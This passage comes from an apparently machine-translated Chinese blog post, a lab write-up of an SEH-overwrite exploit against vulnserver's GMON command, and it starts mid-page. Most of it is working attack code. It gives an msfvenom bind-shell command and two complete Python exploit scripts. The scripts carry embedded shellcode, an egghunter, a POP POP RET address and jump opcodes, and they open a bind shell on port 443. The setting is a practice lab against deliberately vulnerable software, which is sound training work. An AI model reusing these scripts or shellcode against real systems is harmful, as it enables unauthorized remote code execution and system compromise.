mz na"/><span class="mx bw bk my mz"/></div><div class="im in io ip iq"><h2 id="e3be" class="nu jy it bd jz oe of dn kd og oh dp kh lg oi oj kl lk ok ol kp lo om on kt oo bi translated">MSF毒液结合壳</h2><p id="f8a4" class="pw-post-body-paragraph kv kw it kx b ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls im bi translated">让我们快速创建一个<code class="fe lt lu lv lw b">msfvenom</code>绑定外壳。</p><pre class="nh ni nj nk gt nq lw nr ns aw nt bi"><span id="16d2" class="nu jy it lw b gy nv nw l nx ny"><strong class="lw iu">### msfvenom Bind Shell</strong><br/>$ msfvenom -p windows/shell_bind_tcp LPORT=443 -b '\x00' EXITFUNC=thread -f python<em class="pc">(*I used a x86 Kali Linus to create the shellcode)</em></span></pre><figure class="nh ni nj nk gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="oa ob di oc bf od"><div class="gh gi pr"><img src="../Images/fc31f98f59d3e58f024acd8910be29a5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*BnJPIB3rMgZ2KItU.png"/></div></div><figcaption class="nl nm gj gh gi nn no bd b be z dk translated">msfvenom外壳代码</figcaption></figure></div><div class="ab cl mu mv hx mw" role="separator"><span class="mx bw bk my mz na"/><span class="mx bw bk my mz na"/><span class="mx bw bk my mz"/></div><div class="im in io ip iq"><h2 id="b5bb" class="nu jy it bd jz oe of dn kd og oh dp kh lg oi oj kl lk ok ol kp lo om on kt oo bi translated">最终利用</h2><p id="cc4e" class="pw-post-body-paragraph kv kw it kx b ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls im bi translated">让我们用创建的外壳代码来完成我们的PoC脚本。</p><pre class="nh ni nj nk gt nq lw nr ns aw nt bi"><span id="0837" class="nu jy it lw b gy nv nw l nx ny"><strong class="lw iu">### Final_gmon.py</strong></span><span id="52e1" class="nu jy it lw b gy or nw l nx ny">import socket<br/>import struct<br/>import os<br/>import sys</span><span id="dcea" class="nu jy it lw b gy or nw l nx ny">target_command = "GMON /"<br/>offset = 3522<br/>eip = struct.pack("&lt;I", 0x6250172b)              <strong class="lw iu"># POP POP RET</strong><br/>short_jmp = "\xEB\x09\x90\x90"                   <strong class="lw iu"># Short JMP</strong><br/>egg = "T00WT00W"                         </span><span id="6283" class="nu jy it lw b gy or nw l nx ny"><strong class="lw iu"># Egghunter (egg = T00W)</strong><br/>egghunter = ""<br/>egghunter += "\x90\x66\x81\xca\xff\x0f\x42\x52"<br/>egghunter += "\x6a\x02\x58\xcd\x2e\x3c\x05\x5a"<br/>egghunter += "\x74\xef\xb8\x54\x30\x30\x57\x8b"<br/>egghunter += "\xfa\xaf\x75\xea\xaf\x75\xe7\xff"<br/>egghunter += "\xe7"</span><span id="841c" class="nu jy it lw b gy or nw l nx ny"><strong class="lw iu"># Bind Shell (355 Bytes)</strong><br/>buf =  ""<br/>buf += "\xda\xc8\xb8\xaa\xa0\x38\x73\xd9\x74\x24\xf4\x5a\x2b"<br/>buf += "\xc9\xb1\x53\x31\x42\x17\x83\xc2\x04\x03\xe8\xb3\xda"<br/>buf += "\x86\x10\x5b\x98\x69\xe8\x9c\xfd\xe0\x0d\xad\x3d\x96"<br/>buf += "\x46\x9e\x8d\xdc\x0a\x13\x65\xb0\xbe\xa0\x0b\x1d\xb1"<br/>buf += "\x01\xa1\x7b\xfc\x92\x9a\xb8\x9f\x10\xe1\xec\x7f\x28"<br/>buf += "\x2a\xe1\x7e\x6d\x57\x08\xd2\x26\x13\xbf\xc2\x43\x69"<br/>buf += "\x7c\x69\x1f\x7f\x04\x8e\xe8\x7e\x25\x01\x62\xd9\xe5"<br/>buf += "\xa0\xa7\x51\xac\xba\xa4\x5c\x66\x31\x1e\x2a\x79\x93"<br/>buf += "\x6e\xd3\xd6\xda\x5e\x26\x26\x1b\x58\xd9\x5d\x55\x9a"<br/>buf += "\x64\x66\xa2\xe0\xb2\xe3\x30\x42\x30\x53\x9c\x72\x95"<br/>buf += "\x02\x57\x78\x52\x40\x3f\x9d\x65\x85\x34\x99\xee\x28"<br/>buf += "\x9a\x2b\xb4\x0e\x3e\x77\x6e\x2e\x67\xdd\xc1\x4f\x77"<br/>buf += "\xbe\xbe\xf5\xfc\x53\xaa\x87\x5f\x3c\x1f\xaa\x5f\xbc"<br/>buf += "\x37\xbd\x2c\x8e\x98\x15\xba\xa2\x51\xb0\x3d\xc4\x4b"<br/>buf += "\x04\xd1\x3b\x74\x75\xf8\xff\x20\x25\x92\xd6\x48\xae"<br/>buf += "\x62\xd6\x9c\x5b\x6a\x71\x4f\x7e\x97\xc1\x3f\x3e\x37"<br/>buf += "\xaa\x55\xb1\x68\xca\x55\x1b\x01\x63\xa8\xa4\x2c\xcf"<br/>buf += "\x25\x42\x44\x3f\x60\xdc\xf0\xfd\x57\xd5\x67\xfd\xbd"<br/>buf += "\x4d\x0f\xb6\xd7\x4a\x30\x47\xf2\xfc\xa6\xcc\x11\x39"<br/>buf += "\xd7\xd2\x3f\x69\x80\x45\xb5\xf8\xe3\xf4\xca\xd0\x93"<br/>buf += "\x95\x59\xbf\x63\xd3\x41\x68\x34\xb4\xb4\x61\xd0\x28"<br/>buf += "\xee\xdb\xc6\xb0\x76\x23\x42\x6f\x4b\xaa\x4b\xe2\xf7"<br/>buf += "\x88\x5b\x3a\xf7\x94\x0f\x92\xae\x42\xf9\x54\x19\x25"<br/>buf += "\x53\x0f\xf6\xef\x33\xd6\x34\x30\x45\xd7\x10\xc6\xa9"<br/>buf += "\x66\xcd\x9f\xd6\x47\x99\x17\xaf\xb5\x39\xd7\x7a\x7e"<br/>buf += "\x59\x3a\xae\x8b\xf2\xe3\x3b\x36\x9f\x13\x96\x75\xa6"<br/>buf += "\x97\x12\x06\x5d\x87\x57\x03\x19\x0f\x84\x79\x32\xfa"<br/>buf += "\xaa\x2e\x33\x2f"</span><span id="fc30" class="nu jy it lw b gy or nw l nx ny">payload = ""<br/>payload += target_command<br/>payload += "A" * 100<br/>payload += egg<br/>payload += buf<br/>payload += "B" * (offset - 100 - len(egg) - len(buf) - len(short_jmp))<br/>payload += short_jmp<br/>payload += eip<br/>payload += "\x90" * 10<br/>payload += egghunter<br/>payload += "C" * (4103 - offset - len(eip) - 10 - len(egghunter))</span><span id="7aa1" class="nu jy it lw b gy or nw l nx ny">print "[+] Sending buffer (Size: %d)" % len(payload)</span><span id="20c7" class="nu jy it lw b gy or nw l nx ny">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br/>s.connect(('127.0.0.1', 9999))<br/>print(s.recv(1024))<br/>s.send(payload)<br/>s.close()</span></pre><p id="6f1f" class="pw-post-body-paragraph kv kw it kx b ky ml la lb lc mm le lf lg mn li lj lk mo lm ln lo mp lq lr ls im bi translated">一旦我们运行了<code class="fe lt lu lv lw b">final_gmon.py</code>脚本，我们就可以成功地在端口443上打开bind shell。</p><figure class="nh ni nj nk gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="oa ob di oc bf od"><div class="gh gi ps"><img src="../Images/016350f891c07baa7310e3a175d5bc9e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*TCPJncc_xEawwqNgBKketA.png"/></div></div><figcaption class="nl nm gj gh gi nn no bd b be z dk translated">成功绑定外壳</figcaption></figure></div><div class="ab cl mu mv hx mw" role="separator"><span class="mx bw bk my mz na"/><span class="mx bw bk my mz na"/><span class="mx bw bk my mz"/></div><div class="im in io ip iq"><h1 id="aaa8" class="jx jy it bd jz ka nb kc kd ke nc kg kh ki nd kk kl km ne ko kp kq nf ks kt ku bi translated">结论</h1><p id="1b0a" class="pw-post-body-paragraph kv kw it kx b ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls im bi translated">概括一下:</p><ol class=""><li id="e485" class="lx ly it kx b ky ml lc mm lg mr lk ms lo mt ls pt md me mf bi translated">我们模糊了vulnserver <code class="fe lt lu lv lw b">GMON</code>命令</li><li id="1662" class="lx ly it kx b ky mg lc mh lg mi lk mj lo mk ls pt md me mf bi translated">找到了<code class="fe lt lu lv lw b">GMON /</code>有漏洞命令的入口点</li><li id="285e" class="lx ly it kx b ky mg lc mh lg mi lk mj lo mk ls pt md me mf bi translated">找到了控制<code class="fe lt lu lv lw b">SEH</code>覆盖的偏移量</li><li id="3fa9" class="lx ly it kx b ky mg lc mh lg mi lk mj lo mk ls pt md me mf bi translated">发现<code class="fe lt lu lv lw b">POP POP RET</code>地址漏洞利用<code class="fe lt lu lv lw b">SEH</code>覆盖</li><li id="7805" class="lx ly it kx b ky mg lc mh lg mi lk mj lo mk ls pt md me mf bi translated">介绍了一个短JMP搬到一个大一点的地方</li><li id="f0ac" class="lx ly it kx b ky mg lc mh lg mi lk mj lo mk ls pt md me mf bi translated">介绍了Egghunter搬到了更多更大的地方来放我们的bind shell</li></ol><p id="2213" class="pw-post-body-paragraph kv kw it kx b ky ml la lb lc mm le lf lg mn li lj lk mo lm ln lo mp lq lr ls im bi translated">希望你也从中学到了一些东西。感谢阅读！</p></div><div class="ab cl mu mv hx mw" role="separator"><span class="mx bw bk my mz na"/><span class="mx bw bk my mz na"/><span class="mx bw bk my mz"/></div><div class="im in io ip iq"><h1 id="8663" class="jx jy it bd jz ka nb kc kd ke nc kg kh ki nd kk kl km ne ko kp kq nf ks kt ku bi translated">额外的利用方式(没有Egghunter)</h1><p id="1b1b" class="pw-post-body-paragraph kv kw it kx b ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls im bi translated">因此，一旦我们短跳转到49字节空间，而不是使用Egghunter，我们也可以引入一系列操作码来将我们的<code class="fe lt lu lv lw b">EAX</code>寄存器跳转回我们有足够空间添加外壳代码的地方。</p><p id="1939" class="pw-post-body-paragraph kv kw it kx b ky ml la lb lc mm le lf lg mn li lj lk mo lm ln lo mp lq lr ls im bi translated">让我们在短JMP后面添加下面的操作码。</p><pre class="nh ni nj nk gt nq lw nr ns aw nt bi"><span id="d80c" class="nu jy it lw b gy nv nw l nx ny"><strong class="lw iu">### JMP Back Opcode</strong><br/>PUSH ESP<br/>POP EAX<br/>ADD AX, 655<br/>JMP EAX</span></pre><figure class="nh ni nj nk gt ju gh gi paragraph-image"><div class="gh gi pu"><img src="../Images/d9d04737dff3137d2ed24b1f58510b52.png" data-original-src="https://miro.medium.com/v2/resize:fit:1170/format:webp/1*j7U0U5Fy1GMPDVJANSyUkg.png"/></div><figcaption class="nl nm gj gh gi nn no bd b be z dk translated">JMP返回操作码</figcaption></figure><p id="04b5" class="pw-post-body-paragraph kv kw it kx b ky ml la lb lc mm le lf lg mn li lj lk mo lm ln lo mp lq lr ls im bi translated">一旦我们跳过指令，我们将成功地跳到我们控制的“A”位置。让我们添加我们的绑定外壳，并最终确定利用脚本。</p><figure class="nh ni nj nk gt ju gh gi paragraph-image"><div class="gh gi pv"><img src="../Images/93b9108ec1aee69c9c687b1afa5f2480.png" data-original-src="https://miro.medium.com/v2/resize:fit:1346/format:webp/1*Ctey4otupdgsHwUvJy_C4g.png"/></div><figcaption class="nl nm gj gh gi nn no bd b be z dk translated">JMP回来了</figcaption></figure><p id="a967" class="pw-post-body-paragraph kv kw it kx b ky ml la lb lc mm le lf lg mn li lj lk mo lm ln lo mp lq lr ls im bi translated"><em class="pc">*这里的一个提示是，从OllyDbg中，我们可以简单地二进制复制我们编写的操作码，以便在我们的漏洞利用脚本中使用它们。</em></p><figure class="nh ni nj nk gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="oa ob di oc bf od"><div class="gh gi pw"><img src="../Images/cc17e040509910c2f54d1e5fa5a63c34.png" data-original-src="https://miro.medium.com/v2/resize:fit:1392/format:webp/1*Af-dDKfXQ77aGdMBhmyrpw.png"/></div></div><figcaption class="nl nm gj gh gi nn no bd b be z dk translated">二进制复制(选择→右键→二进制→二进制复制)</figcaption></figure><h2 id="aaa3" class="nu jy it bd jz oe of dn kd og oh dp kh lg oi oj kl lk ok ol kp lo om on kt oo bi translated">最终漏洞脚本</h2><pre class="nh ni nj nk gt nq lw nr ns aw nt bi"><span id="aa83" class="nu jy it lw b gy nv nw l nx ny"><strong class="lw iu">### Final </strong><a class="ae mq" href="https://github.com/bigb0sss/OSCE/blob/master/vulnserver/GMON%20-%20SEH%20Overwrite/jmpback_gmon.py" rel="noopener ugc nofollow" target="_blank"><strong class="lw iu">jmpback_gmon.py</strong></a></span><span id="d76f" class="nu jy it lw b gy or nw l nx ny">import socket<br/>import struct<br/>import os<br/>import sys</span><span id="ac52" class="nu jy it lw b gy or nw l nx ny">target_command = "GMON /"<br/>offset = 3522<br/>eip = struct.pack("&lt;I", 0x6250172b)             <strong class="lw iu"># POP POP RET</strong><br/>short_jmp = "\xEB\x09\x90\x90"                  <strong class="lw iu"># Short JMP</strong><br/>jmp_back = "\x54\x58\x66\x05\x55\x06\xFF\xE0"   <strong class="lw iu"># Long JMP</strong></span><span id="2de5" class="nu jy it lw b gy or nw l nx ny"><strong class="lw iu"># Bind Shell (355 Bytes)</strong><br/>buf =  ""<br/>buf += "\xda\xc8\xb8\xaa\xa0\x38\x73\xd9\x74\x24\xf4\x5a\x2b"<br/>buf += "\xc9\xb1\x53\x31\x42\x17\x83\xc2\x04\x03\xe8\xb3\xda"<br/>buf += "\x86\x10\x5b\x98\x69\xe8\x9c\xfd\xe0\x0d\xad\x3d\x96"<br/>buf += "\x46\x9e\x8d\xdc\x0a\x13\x65\xb0\xbe\xa0\x0b\x1d\xb1"<br/>buf += "\x01\xa1\x7b\xfc\x92\x9a\xb8\x9f\x10\xe1\xec\x7f\x28"<br/>buf += "\x2a\xe1\x7e\x6d\x57\x08\xd2\x26\x13\xbf\xc2\x43\x69"<br/>buf += "\x7c\x69\x1f\x7f\x04\x8e\xe8\x7e\x25\x01\x62\xd9\xe5"<br/>buf += "\xa0\xa7\x51\xac\xba\xa4\x5c\x66\x31\x1e\x2a\x79\x93"<br/>buf += "\x6e\xd3\xd6\xda\x5e\x26\x26\x1b\x58\xd9\x5d\x55\x9a"<br/>buf += "\x64\x66\xa2\xe0\xb2\xe3\x30\x42\x30\x53\x9c\x72\x95"<br/>buf += "\x02\x57\x78\x52\x40\x3f\x9d\x65\x85\x34\x99\xee\x28"<br/>buf += "\x9a\x2b\xb4\x0e\x3e\x77\x6e\x2e\x67\xdd\xc1\x4f\x77"<br/>buf += "\xbe\xbe\xf5\xfc\x53\xaa\x87\x5f\x3c\x1f\xaa\x5f\xbc"<br/>buf += "\x37\xbd\x2c\x8e\x98\x15\xba\xa2\x51\xb0\x3d\xc4\x4b"<br/>buf += "\x04\xd1\x3b\x74\x75\xf8\xff\x20\x25\x92\xd6\x48\xae"<br/>buf += "\x62\xd6\x9c\x5b\x6a\x71\x4f\x7e\x97\xc1\x3f\x3e\x37"<br/>buf += "\xaa\x55\xb1\x68\xca\x55\x1b\x01\x63\xa8\xa4\x2c\xcf"<br/>buf += "\x25\x42\x44\x3f\x60\xdc\xf0\xfd\x57\xd5\x67\xfd\xbd"<br/>buf += "\x4d\x0f\xb6\xd7\x4a\x30\x47\xf2\xfc\xa6\xcc\x11\x39"<br/>buf += "\xd7\xd2\x3f\x69\x80\x45\xb5\xf8\xe3\xf4\xca\xd0\x93"<br/>buf += "\x95\x59\xbf\x63\xd3\x41\x68\x34\xb4\xb4\x61\xd0\x28"<br/>buf += "\xee\xdb\xc6\xb0\x76\x23\x42\x6f\x4b\xaa\x4b\xe2\xf7"<br/>buf += "\x88\x5b\x3a\xf7\x94\x0f\x92\xae\x42\xf9\x54\x19\x25"<br/>buf += "\x53\x0f\xf6\xef\x33\xd6\x34\x30\x45\xd7\x10\xc6\xa9"<br/>buf += "\x66\xcd\x9f\xd6\x47\x99\x17\xaf\xb5\x39\xd7\x7a\x7e"<br/>buf += "\x59\x3a\xae\x8b\xf2\xe3\x3b\x36\x9f\x13\x96\x75\xa6"<br/>buf += "\x97\x12\x06\x5d\x87\x57\x03\x19\x0f\x84\x79\x32\xfa"<br/>buf += "\xaa\x2e\x33\x2f"</span><span id="ca28" class="nu jy it lw b gy or nw l nx ny">payload = ""<br/>payload += target_command<br/>payload += "A" * 100<br/>payload += "\x90" * 200<br/>payload += buf<br/>payload += "\x90" * (offset - 300 - len(buf) - len(short_jmp))<br/>payload += short_jmp<br/>payload += eip<br/>payload += "\x90" * 5<br/>payload += jmp_back<br/>payload += "C" * (4103 - offset - len(eip) - 5 - len(jmp_back))</span><span id="3a9f" class="nu jy it lw b gy or nw l nx ny">print "[+] Sending buffer (Size: %d)" % len(payload)</span><span id="6d11" class="nu jy it lw b gy or nw l nx ny">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br/>s.connect(('127.0.0.1', 9999))<br/>print(s.recv(1024))<br/>s.send(payload)<br/>s.close()</span></pre><figure class="nh ni nj nk gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="oa ob di oc bf od"><div class="gh gi px"><img src="../Images/e34a10d5ec6cded37bf5192581a884e7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*yjjqUAnNKOVZ-1gA.png"/></div></div></figure></div></div>    
</body>
</html>